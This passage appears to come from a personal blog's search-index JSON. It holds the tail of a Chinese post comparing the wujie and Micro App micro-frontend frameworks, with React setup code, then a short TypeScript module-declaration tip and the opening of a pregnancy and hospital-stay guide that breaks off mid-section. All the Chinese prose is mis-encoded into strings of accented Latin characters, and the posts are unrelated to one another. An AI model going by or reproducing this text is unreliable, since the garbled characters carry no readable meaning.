é—´ï¼‰é€šè®¯ï¼Œæ— ç•Œå­åº”ç”¨ iframe çš„ url ä¼šè®¾ç½®ä¸ºä¸»åº”ç”¨çš„åŸŸåï¼ˆåŒåŸŸï¼‰ï¼Œå› æ­¤ iframe çš„ location.href å¹¶ä¸æ˜¯å­åº”ç”¨çš„ urlã€‚åˆ›å»ºå¥½ååœæ­¢åŠ è½½iframeã€‚ iframeå†…æ’å…¥jsï¼Œå°†æŠ½ç¦»å‡ºæ¥çš„scriptè„šæœ¬ï¼Œæ’åˆ°iframeä¸­å»ï¼Œåœ¨iframeä¸­æ‰§è¡Œå­åº”ç”¨çš„js åˆ›å»ºweb componentï¼Œidä¸ºå­åº”ç”¨idï¼Œå°†æŠ½ç¦»å‡ºæ¥çš„htmlæ’å…¥ã€‚ ç”±äºiframeå†…çš„jsæœ‰å¯èƒ½æ“ä½œdomï¼Œä½†æ˜¯iframeå†…æ²¡æœ‰domï¼Œéšæ„wujieæ¡†æ¶å†…å¯¹iframeæ‹¦æˆªdocumentå¯¹è±¡ï¼Œç»Ÿä¸€å°†domæŒ‡å‘shadowRootï¼Œæ­¤æ—¶æ¯”å¦‚æ–°å»ºå…ƒç´ ã€å¼¹çª—æˆ–è€…å†’æ³¡ç»„ä»¶å°±å¯ä»¥æ­£å¸¸çº¦æŸåœ¨shadowRootå†…éƒ¨ã€‚ 2.wujieå®æˆ˜ wujieæ¥å…¥å¾ˆç®€å•ï¼Œä¸»åº”ç”¨å¯ä»¥è®©å¼€å‘è€…ä»¥ç»„ä»¶çš„æ–¹å¼åŠ è½½å­åº”ç”¨ã€‚å­åº”ç”¨åªéœ€è¦åšæ”¯æŒè·¨åŸŸè¯·æ±‚æ”¹é€ ï¼Œè¿™ä¸ªæ˜¯æ‰€æœ‰å¾®å‰ç«¯æ¡†æ¶è¿è¡Œçš„å‰æï¼Œé™¤æ­¤ä¹‹å¤–å­åº”ç”¨å¯ä»¥ä¸åšä»»ä½•æ”¹é€ å°±å¯ä»¥åœ¨æ— ç•Œæ¡†æ¶ä¸­è¿è¡Œï¼Œä¸è¿‡æ­¤æ—¶è¿è¡Œçš„æ–¹å¼æ˜¯é‡å»ºæ¨¡å¼ã€‚ å­åº”ç”¨ä¹Ÿå¯ä»¥é…ç½®ä¿æ´»ã€ç”Ÿå‘½å‘¨æœŸé€‚é…è¿›å…¥ä¿æ´»æ¨¡å¼æˆ–å•ä¾‹æ¨¡å¼ã€‚\ni.ä¸»åº”ç”¨å…¥å£æ–‡ä»¶ ä¸å…¶ä»–æ¡†æ¶ä¸€æ ·ï¼Œå…ˆé…ç½®å­åº”ç”¨\n// main-react/index.js import \u0026#34;react-app-polyfill/stable\u0026#34;; import \u0026#34;react-app-polyfill/ie11\u0026#34;; import React from \u0026#34;react\u0026#34;; import ReactDOM from \u0026#34;react-dom\u0026#34;; import WujieReact from \u0026#34;wujie-react\u0026#34;; import \u0026#34;./index.css\u0026#34;; import App from \u0026#34;./App\u0026#34;; import hostMap from \u0026#34;./hostMap\u0026#34;; import credentialsFetch from \u0026#34;./fetch\u0026#34;; import lifecycles from \u0026#34;./lifecycle\u0026#34;; import plugins from \u0026#34;./plugin\u0026#34;; const { setupApp, preloadApp, bus } = WujieReact; const isProduction = process.env.NODE_ENV === \u0026#34;production\u0026#34;; bus.$on(\u0026#34;click\u0026#34;, (msg) =\u0026gt; window.alert(msg)); const degrade = window.localStorage.getItem(\u0026#34;degrade\u0026#34;) === \u0026#34;true\u0026#34; || !window.Proxy || !window.CustomElementRegistry; /** * å¤§éƒ¨åˆ†ä¸šåŠ¡æ— éœ€è®¾ç½® attrs * æ­¤å¤„ä¿®æ­£ iframe çš„ srcï¼Œæ˜¯é˜²æ­¢github pages cspæŠ¥é”™ * å› ä¸ºé»˜è®¤æ˜¯åªæœ‰ host+portï¼Œæ²¡æœ‰æºå¸¦è·¯å¾„ */ const attrs = isProduction ? { src: hostMap(\u0026#34;//localhost:7700/\u0026#34;) } : {}; /** * é…ç½®åº”ç”¨ï¼Œä¸»è¦æ˜¯è®¾ç½®é»˜è®¤é…ç½® * preloadAppã€startAppçš„é…ç½®ä¼šåŸºäºè¿™ä¸ªé…ç½®åšè¦†ç›– */ setupApp({ name: \u0026#34;react16\u0026#34;, url: hostMap(\u0026#34;//localhost:7600/\u0026#34;), attrs, // å­åº”ç”¨iframeçš„src exec: true, // é¢„æ‰§è¡Œ fetch: credentialsFetch, // è‡ªå®šä¹‰çš„fetchæ–¹æ³• plugins, /** å­åº”ç”¨çŸ­è·¯å¾„æ›¿æ¢ï¼Œè·¯ç”±åŒæ­¥æ—¶ç”Ÿæ•ˆ */ prefix: { \u0026#34;prefix-dialog\u0026#34;: \u0026#34;/dialog\u0026#34;, \u0026#34;prefix-location\u0026#34;: \u0026#34;/location\u0026#34; }, /** å­åº”ç”¨é‡‡ç”¨é™çº§iframeæ–¹æ¡ˆ */ degrade, ...lifecycles, }); setupApp({ name: \u0026#34;vue3\u0026#34;, url: hostMap(\u0026#34;//localhost:7300/\u0026#34;), attrs, exec: true, alive: true, // å­åº”ç”¨ä¿æ´»ï¼Œstateä¸ä¼šä¸¢å¤± plugins: [{ cssExcludes: [\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34;] }], // å¼•å…¥äº†çš„ç¬¬ä¸‰æ–¹æ ·å¼ä¸éœ€è¦æ·»åŠ credentials fetch: (url, options) =\u0026gt; url.includes(hostMap(\u0026#34;//localhost:7300/\u0026#34;)) ? credentialsFetch(url, options) : window.fetch(url, options), degrade, ...lifecycles, }); if (window.localStorage.getItem(\u0026#34;preload\u0026#34;) !== \u0026#34;false\u0026#34;) { preloadApp({ name: \u0026#34;react16\u0026#34;, }); if (window.Proxy) { preloadApp({ name: \u0026#34;vue3\u0026#34;, }); } } ReactDOM.render(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); å¼•å…¥å­åº”ç”¨çš„åœ°æ–¹ç›´æ¥ä»¥ç»„ä»¶å¼çš„æ–¹å¼å¼•å…¥ï¼š\nimport React from \u0026#34;react\u0026#34;; import hostMap from \u0026#34;../hostMap\u0026#34;; import WujieReact from \u0026#34;wujie-react\u0026#34;; import { useNavigate, useLocation } from \u0026#34;react-router-dom\u0026#34;; export default function React16() { const navigation = useNavigate(); const location = useLocation(); const path = location.pathname.replace(\u0026#34;/react16-sub\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;/react16\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;/\u0026#34;,\u0026#34;\u0026#34;); //// const react16Url = hostMap(\u0026#34;//localhost:7600/\u0026#34;) + path; const props = { jump: (name) =\u0026gt; { navigation(`/${name}`); }, }; return ( // å•ä¾‹æ¨¡å¼ï¼Œnameç›¸åŒåˆ™å¤ç”¨ä¸€ä¸ªæ— ç•Œå®ä¾‹ï¼Œæ”¹å˜urlåˆ™å­åº”ç”¨é‡æ–°æ¸²æŸ“å®ä¾‹åˆ°å¯¹åº”è·¯ç”± \u0026lt;WujieReact width=\u0026#34;100%\u0026#34; height=\u0026#34;100%\u0026#34; name=\u0026#34;react16\u0026#34; url={react16Url} sync={!path} props={props} \u0026gt;\u0026lt;/WujieReact\u0026gt; ); } ii.é¢„è§ˆ 2.æ¡†æ¶ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š\næ¥å…¥ç®€å•ï¼Œå¯ä»¥ä»¥ç»„ä»¶çš„æ–¹å¼å¼•å…¥å­åº”ç”¨ çº¯å‡€æ— æ±¡æŸ“ æ— ç•Œåˆ©ç”¨iframeå’Œwebcomponentæ¥æ­å»ºå¤©ç„¶çš„jséš”ç¦»æ²™ç®±å’Œcsséš”ç¦»æ²™ç®± åˆ©ç”¨iframeçš„historyå’Œä¸»åº”ç”¨çš„historyåœ¨åŒä¸€ä¸ªtop-level browsing contextæ¥æ­å»ºå¤©ç„¶çš„è·¯ç”±åŒæ­¥æœºåˆ¶ å‰¯ä½œç”¨å±€é™åœ¨æ²™ç®±å†…éƒ¨ï¼Œå­åº”ç”¨åˆ‡æ¢æ— éœ€ä»»ä½•æ¸…ç†å·¥ä½œï¼Œæ²¡æœ‰é¢å¤–çš„åˆ‡æ¢æˆæœ¬ æ”¯æŒvite esmoudleåŠ è½½ï¼Œç”±äºjsæ˜¯ç‹¬ç«‹åœ¨iframeä¸­åŠ è½½çš„ï¼Œæ‰€ä»¥æ”¯æŒesmoduleåŠ è½½ æ”¯æŒé¢„åŠ è½½ æ”¯æŒåº”ç”¨ä¿æ´»ï¼Œå­åº”ç”¨çŠ¶æ€ä¿ç•™ï¼Œç”±äºæ˜¯ç‹¬ç«‹åœ¨iframeä¸­çš„ï¼Œè€Œåˆ‡æ¢åº”ç”¨æ—¶ä¸ä¼šç§»é™¤iframeï¼Œæ‰€ä»¥å­åº”ç”¨çš„çŠ¶æ€ä¼šè¢«ä¿ç•™åœ¨åŸæ¥çš„iframeä¸­ï¼Œå½“ä¸»åº”ç”¨å†æ¬¡æ¸²æŸ“å­åº”ç”¨domæ—¶ï¼Œä¼šæ˜¾ç¤ºä¹‹å‰çš„çŠ¶æ€ã€‚ å¤šåº”ç”¨åŒæ—¶æ¿€æ´»åœ¨çº¿ ç¼ºç‚¹ï¼š\niframeæ²™ç®±çš„srcè®¾ç½®äº†ä¸»åº”ç”¨çš„hostï¼Œåˆå§‹åŒ–iframeçš„æ—¶å€™éœ€è¦ç­‰å¾…iframeçš„location.orignä»\u0026rsquo;about:blank\u0026rsquo;åˆå§‹åŒ–ä¸ºä¸»åº”ç”¨çš„hostï¼Œè¿™ä¸ªé‡‡ç”¨çš„è®¡æ—¶å™¨å»ç­‰å¾…çš„ä¸æ˜¯å¾ˆä¼˜é›…ã€‚ æ¡†æ¶4: Micro App mirco-app æ˜¯äº¬ä¸œ2021å¹´å¼€æºçš„ä¸€æ¬¾å¾®å‰ç«¯æ¡†æ¶ã€‚å®ƒå€ŸåŠ©äº†æµè§ˆå™¨å¯¹ webComponent çš„æ”¯æŒï¼Œå®ç°äº†ä¸€å¥—å¾®å‰ç«¯æ–¹æ¡ˆä½“ç³»ã€‚å¹¶ä¸”ç”±äº Shadow Dom å¯¹ react è¿™ç±»åº“çš„å…¼å®¹æ€§è¾ƒå·®ï¼Œä¾¿è‡ªå·±å®ç°äº†ç±» Shadow Dom çš„æ•ˆæœã€‚ä¸ qiankun ç›¸æ¯”ï¼Œæ¥å…¥æ›´åŠ ç®€å•ã€‚æœ€æ–°çš„ç‰ˆæœ¬ä¹Ÿæ”¯æŒiframeå®ç°jséš”ç¦»ï¼Œç±»ä¼¼wujieã€‚æˆªè‡³ç›®å‰ï¼ˆ2024å¹´4æœˆï¼‰github star 5.2k\n1.å®ç°æ–¹æ¡ˆ é¦–å…ˆmicro-appå®ç°äº†ä¸€ä¸ªåŸºäºWebComponentçš„ç»„ä»¶ï¼Œå¹¶å®ç°äº†ç±»Shadow Dom çš„æ•ˆæœï¼Œå¼€å‘è€…åªéœ€è¦ç”¨\u0026lt;micro-app name=\u0026quot;xx\u0026quot; url=\u0026quot;xx\u0026quot; baseroute=\u0026quot;/xxx/xxx\u0026quot;\u0026gt;æ¥åŠ è½½å­åº”ç”¨ï¼Œæ•´ä¸ªå¯¹å­åº”ç”¨çš„åŠ è½½ã€jséš”ç¦»ã€csséš”ç¦»çš„é€»è¾‘éƒ½å°è£…åœ¨äº†web componentç»„ä»¶\u0026lt;micro-app\u0026gt;ä¸­ï¼Œå…·ä½“æ¥è¯´ï¼š\nå½“è°ƒç”¨microApp.start()åï¼Œä¼šæ³¨å†Œä¸€ä¸ªåä¸ºmicro-app çš„è‡ªå®šä¹‰ webComponent æ ‡ç­¾ã€‚æˆ‘ä»¬å¯ä»¥ä» \u0026lt;micro-app name='app1' url='xx' baseroute='/my-page'\u0026gt;\u0026lt;/micro-app\u0026gt; ä¸­æ‹¿åˆ°å­åº”ç”¨çš„çº¿ä¸Šå…¥å£åœ°å€ã€‚ \u0026lt;micro-app\u0026gt;ç»„ä»¶å†…éƒ¨ï¼Œå½“åŒ¹é…åˆ°è·¯ç”±åï¼Œè·Ÿqiankunä¸€æ ·åŠ è½½htmlï¼Œå¾—åˆ°htmlå­—ç¬¦ä¸²æ¨¡ç‰ˆ åˆ†æhtmlå­—ç¬¦ä¸²ï¼Œæå–\u0026lt;head\u0026gt;å¤´å’Œ\u0026lt;body\u0026gt;ï¼Œå¹¶æ›¿æ¢ä¸ºæ¡†æ¶è‡ªå®šä¹‰æ ‡ç­¾\u0026lt;micro-app-head\u0026gt;å’Œ\u0026lt;micro-app-body\u0026gt; åœ¨\u0026lt;micro-app-head\u0026gt;å†…ï¼Œä¼šå¯¹scriptæ ‡ç­¾å’Œlinkæ ‡ç­¾çš„å†…å®¹è¿›è¡ŒåŠ è½½å¹¶æ‰§è¡Œ å°†\u0026lt;micro-app-head\u0026gt;å’Œ\u0026lt;micro-app-body\u0026gt;æ’å…¥åˆ°\u0026lt;micro-app\u0026gt;æ ‡ç­¾å†… \u0026lt;micro-app\u0026gt;å†…æä¾›äº†jsæ²™ç®±æ–¹æ³•ï¼ˆv1.0ä»¥å‰è·Ÿqiankunæ²™ç®±ä¸€æ ·ï¼‰ï¼Œ\u0026lt;micro-app-head\u0026gt;æŒ‚è½½åˆ°\u0026lt;micro-app\u0026gt;åï¼Œå†…éƒ¨ä¼šé€ä¸€å¯¹\u0026lt;micro-app-head\u0026gt;å†…çš„scriptæ ‡ç­¾çš„jsç»‘å®šä½œç”¨åŸŸï¼Œå®ç°jséš”ç¦»ã€‚ csséš”ç¦»æ–¹æ¡ˆ é»˜è®¤ä½¿ç”¨æ­£åˆ™å°†CSSå­—ç¬¦ä¸²åˆ‡å‰²æˆæœ€å°å•å…ƒï¼Œæ¯ä¸ªå•å…ƒåŒ…å«ä¸€æ®µCSSä¿¡æ¯ï¼Œå°†æ‰€æœ‰çš„ä¿¡æ¯æ•´ç†ç”ŸæˆCSSTreeï¼Œéå†CSSTreeçš„æ¯ä¸ªè§„åˆ™ï¼Œæ·»åŠ å‰ç¼€å®ç°æ ·å¼éš”ç¦»ã€‚\njséš”ç¦»æ–¹æ¡ˆ micro-appæœ‰ä¸¤ç§æ–¹å¼å®ç°jséš”ç¦»ï¼Œé»˜è®¤æ˜¯è·Ÿqiankunä¸€æ ·é‡‡ç”¨proxyæ²™ç®±çš„æ–¹å¼éš”ç¦»ï¼Œ åœ¨v1.0å‘å¸ƒåæ”¯æŒäº†åŸºäºåŸç”Ÿiframeçš„éš”ç¦»æ–¹å¼ã€‚\n2.Micro Appå®æˆ˜ i.ä¸»åº”ç”¨å…¥å£æ–‡ä»¶ import React from \u0026#39;react\u0026#39;; import ReactDOM from \u0026#39;react-dom\u0026#39;; import \u0026#39;./index.css\u0026#39;; import Router from \u0026#39;./router\u0026#39;; import microApp from \u0026#39;@micro-zoe/micro-app\u0026#39; microApp.start() ReactDOM.render( \u0026lt;React.StrictMode\u0026gt; \u0026lt;Router /\u0026gt; \u0026lt;/React.StrictMode\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;) ); è°ƒç”¨å­åº”ç”¨\nexport function MyPage () { return ( \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;å­åº”ç”¨ğŸ‘‡\u0026lt;/h1\u0026gt; // nameï¼šåº”ç”¨åç§°, urlï¼šåº”ç”¨åœ°å€ \u0026lt;micro-app name=\u0026#39;my-app\u0026#39; url=\u0026#39;http://localhost:3000/\u0026#39;\u0026gt;\u0026lt;/micro-app\u0026gt; \u0026lt;/div\u0026gt; ) } ii.é¢„è§ˆ 2.æ¡†æ¶ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹\næ¥å…¥ç®€å•ï¼Œç»„ä»¶å¼å¼•å…¥å­åº”ç”¨ å›¢é˜ŸæŒç»­æ›´æ–°ç»´æŠ¤ jséš”ç¦»ã€csséš”ç¦»ã€è·¯ç”±åŒæ­¥ æ”¯æŒå­åº”ç”¨ä¿æ´», éœ€è¦å¼€å¯keep-aliveæ¨¡å¼ æ”¯æŒfiberæ¨¡å¼ï¼Œæå‡ä¸»åº”ç”¨çš„æ¸²æŸ“æ€§èƒ½ã€‚ ç¼ºç‚¹\n1.0ä¹‹å‰ä¸æ”¯æŒviteï¼Œ1.0ä¹‹åæ”¯æŒäº† é»˜è®¤csséš”ç¦»æ–¹å¼ï¼Œä¸»åº”ç”¨çš„æ ·å¼è¿˜æ˜¯ä¼šæ±¡æŸ“åˆ°å­åº”ç”¨ã€‚ å­åº”ç”¨å’Œä¸»åº”ç”¨å¿…é¡»ç›¸åŒçš„è·¯ç”±æ¨¡å¼ï¼Œè¦ä¹ˆåŒæ—¶hashæ¨¡å¼ï¼Œè¦ä¹ˆåŒæ—¶historyæ¨¡å¼ ä¾èµ–äºCustomElementså’ŒProxyä¸¤ä¸ªè¾ƒæ–°çš„APIã€‚Proxyæš‚æ—¶æ²¡æœ‰åšå…¼å®¹ï¼Œæ‰€ä»¥å¯¹äºä¸æ”¯æŒProxyçš„æµè§ˆå™¨æ— æ³•è¿è¡Œmicro-appã€‚ å‚è€ƒ æ¢æ¢å„ä¸ªå¾®å‰ç«¯æ¡†æ¶ | å¥‡èˆç²¾é€‰ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/microfrontend_framework_compare/","summary":"ç³»åˆ—æ–‡ç« ï¼š ç¬¬ä¸€ç¯‡ï¼šå¾®å‰ç«¯: qiankunã€wujieå’ŒMic","title":"å¾®å‰ç«¯: qiankunã€wujieå’ŒMicro Appç­‰æ¡†æ¶å¯¹æ¯”"},{"content":"æ‘˜è¦\u0026hellip;\nä¸€ã€è¯­æ³•ç±»ï¼šä»£ç ç‰‡æ®µ 1.ç±»å‹ a.æŒ‡å®šobjectç±»å‹ private userData : { [key: string]: any } äºŒã€é…ç½®ç±»ï¼šå¸¸è§é—®é¢˜ 1.æŠ¥é”™æ¨¡å—â€œxxxâ€æ²¡æœ‰å¯¼å‡ºçš„æˆå‘˜â€œZNavigatorâ€ è¯¦ç»†æŠ¥é”™: åœ¨tsçš„é¡¹ç›®ä¸­ï¼Œé€šè¿‡import { ZNavigator } from '@lianpf/native-sdk-plus'å¼•å…¥ï¼Œä½†æŠ¥é”™ æ¨¡å—\u0026quot;@lianpf/native-sdk-plus\u0026quot;æ²¡æœ‰å¯¼å‡ºçš„æˆå‘˜â€œZNavigatorâ€ã€‚ts(2305)\nåŸå› ï¼š\nåŸå› æ˜¯@lianpf/native-sdk-pluså†…éƒ¨ä¸ºjsåº“ï¼Œé‚£ä¹ˆè¦å¦‚ä½•é…ç½®ï¼Œå¯ä»¥å¿½ç•¥è¿™äº›tsé”™è¯¯æç¤ºå‘¢\nè§£å†³åŠæ³•ï¼š\ntsconfig.json\n{ \u0026#34;extends\u0026#34;:\u0026#34;./src/.zmi/tsconfig.json\u0026#34;, \u0026#34;compilerOptions\u0026#34;: { \u0026#34;allowJs\u0026#34;: true, \u0026#34;checkJs\u0026#34;: false, // å…¶ä»–ç¼–è¯‘é€‰é¡¹ \u0026#34;typeRoots\u0026#34;: [\u0026#34;src/@types/native-sdk-plus.d.ts\u0026#34;], } } src/@types/native-sdk-plus.d.ts\ndeclare module \u0026#39;@zto/zt-sdk-plus\u0026#39; { // åº“çš„å¯¼å‡ºç±»å‹å’Œå‡½æ•°å£°æ˜ // ... å…¶ä»–ç±»å‹å’Œå‡½æ•°å£°æ˜ // const lib: { // // å…è®¸ä»»æ„æ–¹æ³•åï¼Œä½†è¿™ä¸æ˜¯ä¸€ä¸ªå¥½çš„åšæ³•ï¼Œå› ä¸ºå®ƒä¼šå¤±å»ç±»å‹å®‰å…¨æ€§ // [methodName: string]: (...args: any[]) =\u0026gt; any; // }; // export = lib; export const ZNavigator: any; } å‚è€ƒ \u0026hellip; æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/ts-codefragment/","summary":"\u003cp\u003eæ‘˜è¦\u0026hellip;\u003c/p\u003e","title":"å¸¸è§é—®é¢˜\u0026ä»£ç ç‰‡æ®µ: TS"},{"content":"åˆä¸ºäººçˆ¶ï¼Œæ˜¯ä¸€æ®µä»¤äººæ¬£å–œä½†ä¹Ÿå®¹æ˜“ä¸åšæ‰€é”™çš„é˜¶æ®µã€‚è¿™é‡Œè®°å½•äº†ä¸€äº›ï¼Œåœ¨å­•æœŸä¸­å¯¹äºåª³å¦‡å„¿å’Œå®å®ç›¸å…³çš„æ³¨æ„äº‹é¡¹ã€‚\næœ¬æ–‡ã€å­•æœŸç³»åˆ—ã€‘çš„æœ€å1ç¯‡ ã€Šå­•æœŸ: ä½é™¢é™ªæŠ¤æ”»ç•¥å’Œåˆ†å¨©ã€‹ï¼Œæœ¬ç³»åˆ—å…¶ä»–æ–‡ç« ï¼š\nç¬¬1ç¯‡ ã€Šå­•æœŸ: èƒŒæ™¯çŸ¥è¯†å’Œèƒæ•™ã€‹ ä¸€ã€ä½é™¢é™ªæŠ¤æ”»ç•¥ 1.å­•æ™šæœŸç¯‡ å­•28å‘¨-åˆ†å¨©å‰: ç£ä¿ƒå¦ˆå¦ˆå®Œæˆæ•°èƒåŠ¨å›å®¶ä½œä¸š å­•34å‘¨-37å‘¨å‰ï¼šæ•´ç†ã€ç†Ÿæ‚‰ã€‘å¾…äº§åŒ…å’Œä½é™¢é™ªåºŠç‰©å“ ç‰¹åˆ«æé†’ï¼š\nè¯·æ ¸å¯¹æ–‡ä»¶ç±»ï¼šå¦‚èº«ä»½è¯å¤å°ä»¶ï¼ˆæ­£åé¢åœ¨ä¸€é¡µï¼‰ç­‰ äºŒç±»æ¶ˆæ¯’ç‰©å“è§„èŒƒä½¿ç”¨ï¼šè¯·ä¸è¦æºå¸¦æœ‰å®‰å…¨éšæ‚£çš„ç‰©å“ï¼ˆé£Ÿå“å’Œç‰©å“å®‰å…¨ï¼‰ æå‰è§„åˆ’æ¥é™¢äº¤é€šï¼Œç ´æ°´è¯·æ‰“120ï¼ˆå‘ŠçŸ¥120å»é•¿å¦‡å¹¼ï¼‰ ç†Ÿæ‚‰äº§ååŠç†ç›¸å…³äº‹å®œï¼ˆå‡ºç”Ÿè¯æ˜ç­‰ï¼‰ æ–¹å¼1ï¼šé•¿å¦‡å¹¼å¾®ä¿¡å…¬ä¼—å· -\u0026gt; å¾®è‡ªåŠ© -\u0026gt; ä½é™¢æœåŠ¡ -\u0026gt; å‡ºç”Ÿä¸€ä»¶äº‹ æ–¹å¼2ï¼šéšç”³åŠ -\u0026gt; å‡ºç”Ÿä¸€ä»¶äº‹ -\u0026gt; å¾®è§†é¢‘ æ³¨æ„ï¼šéœ€æŸ¥è¯¢ã€ç½‘ç»œæµç¨‹ã€‘å’Œã€ç°åœºåŠç†è¦æ±‚ã€‘ã€‚ä¸€æ—¦çº¿ä¸‹åŠç†äº†ã€å‡ºç”Ÿè¯æ˜ã€‘ï¼Œåˆ™å‰©ä¸‹çš„æµç¨‹éœ€è¦å…¨éƒ¨èµ°çº¿ä¸‹æµç¨‹ã€‚ 2.å…¥é™¢ç¯‡ 2.1 å¸¸è§„å…¥é™¢ æ³¨æ„ï¼šä½é™¢æœŸé—´æ‰€æœ‰çº¸è´¨ç‰ˆèµ„æ–™è¯·ç»Ÿä¸€æ”¾å…¥æ–‡ä»¶è¢‹ä¸­ï¼Œé¿å…é‡è¦èµ„æ–™é—å¤±ï¼šå¦‚ä½é™¢æŠ¼é‡‘å•\nåŒ»ç”Ÿå¼€å…¥é™¢å•ï¼šäº¤ã€å…¥é™¢å¤„ã€‘ï¼ˆ2å·æ¥¼ä½é™¢éƒ¨ï¼‰ï¼Œç­‰å¾…ç”µè¯åŠç†å…¥é™¢ã€‚ç‰¹éœ€äº¤ç‰¹éœ€å§å°ï¼Œèµ°ç‰¹éœ€æµç¨‹ï¼Œç­‰å¾…ç”µè¯åŠç†å…¥é™¢ã€‚ å¾…äº§å®¤å’Œäº§æˆ¿å›ºå®šå®¶å±1ä½ï¼Œå„ç±»ç—…åŒºé™ªæŠ¤1ä½ï¼Œéå¿…è¦ä¸æ¢äºº åŠç†ä½é™¢æ‰‹ç»­æ—¶ï¼Œå¯ç™»è®°åºŠä½éœ€æ±‚ 2.2 æ€¥è¯Šå…¥é™¢ åŒ»é™¢æ€¥è¯Šåœ°å€ï¼šæ„šå›­è·¯786å·ï¼ˆç‰¹éœ€å’Œæ™®é€šå‡æ˜¯ï¼‰ã€‚å°±åœ¨åŒ»é™¢é—¨è¯Šéš”å£ï¼Œå…¨å¹´å…¨å¤©24å°æ—¶å¼€è¯Šã€‚\næŠŠæ¡æ€¥è¯Šæ¥é™¢æŒ‡å¾ â€”â€” å‚è€ƒ ã€Šå­•æ™šæœŸä¿å¥è¯¾ã€‹è¯¾ä»¶ é€‰æ‹©åˆé€‚äº¤é€šå·¥å…·æ¥é™¢ï¼Œå¸¦å¥½å…¥é™¢å„ç±»ç‰©å“ ç ´æ°´è¯·æ‰“120ï¼Œå‘ŠçŸ¥120å·¥ä½œäººå‘˜è¦å»çš„åˆ†å¨©åŒ»é™¢ï¼ˆé•¿å¦‡å¹¼ï¼‰ã€‚æ€æ ·åŒºåˆ†èƒè†œæ—©ç ´ï¼Œå‚è€ƒ å­•æ™šæœŸè¯¾ä»¶ ç¬¦åˆä½é™¢æ ‡å‡†ï¼šåŠç†ä½é™¢æ‰‹ç»­ï¼Œå…¥ä½å¾…äº§å®¤ï¼ˆè‡ªç„¶åˆ†å¨©å‡†çˆ¸çˆ¸å…¨ç¨‹é™ªåŒï¼Œå‰–è…¹äº§å®¶å±æŒ‡å®šåŒºåŸŸç­‰å€™ï¼‰ã€‚ 3.äº§æ—¶ç¯‡ æ³¨æ„ï¼šåŒ»é™¢ç¦æ­¢æ‹ç…§ã€æ‘„åƒå’Œå½•éŸ³ã€‚è‡ªæ‹æ—¶ï¼Œè¯·å‹¿å½±å“å’Œæ‹æ‘„å…¶ä»–äººï¼ˆå·¥ä½œäººå‘˜å’Œå…¶ä»–å­•äº§å¦‡å®¶å±ï¼‰\nå…¥å®¤å‡†å¤‡ï¼š å£ç½©ã€å¸½å­ã€é‹å¥—ã€å®¶å±å†…ç©¿è¡£ï¼ˆåŒ»é™¢æä¾›ï¼‰ å…¥å®¤å‡éœ€æ‰‹æ¶ˆæ¯’ èƒç›˜å¤„ç½®ï¼š è‡ªç•™ï¼šå®¹æ˜“å˜è´¨ï¼ŒåŠæ—¶é€å‡º åŒ»é™¢å¤„ç†ï¼šæŒ‰ç…§åºŸå¼ƒåŒ»ç–—å™¨æ¢°å¤„ç† å¿…é¡»åŒ»é™¢å¤„ç†ï¼šç—…å˜ç±»å‹æˆ–éœ€åˆ‡ç‰‡æ£€æŸ¥ç±»å‹ 4.äº§åç¯‡ 4.1 å‡†çˆ¸çˆ¸æ•´ç†ç‰©å“é¡»çŸ¥ æ³¨æ„è´µé‡ç‰©å“çš„ä¿ç®¡\nåºŠå¤´æŸœï¼šæ”¾ç½®å¸¸ç”¨ç‰©å“ï¼ˆæ°´æ¯ã€çº¸å·¾ç­‰ï¼‰ å©´å„¿åºŠä¸‹ï¼šå°¿å¸ƒã€æ¹¿çº¸å·¾ã€å«ç”Ÿå·¾ã€é©¬æ¡¶å«ç­‰ å£æ©±ï¼šå¯æ”¾ç½®è´µé‡ç‰©å“å’Œå…¶ä½™ç‰©å“ï¼Œã€åŠæ—¶ä¸Šé”ã€‘ å¦¥å–„ä¿ç®¡ï¼šé™ªå®¢è¯å’ŒåŒ»é™¢é—¨ç¦å¡ é¦–æ¬¡å»æŠ¤å£«å§å°åŠç†ç™»è®°æ‰‹ç»­ï¼šæºå¸¦æ‰‹æœºã€å¤«å¦»åŒæ–¹èº«ä»½è¯ã€é™ªå®¢è¯å¤‡ç”¨ 4.2 å‡†çˆ¸çˆ¸å¡«å†™ä¿¡æ¯é¡»çŸ¥ï¼ˆæ–°ç”Ÿå„¿ç–¾ç—…ç­›æŸ¥ï¼‰ 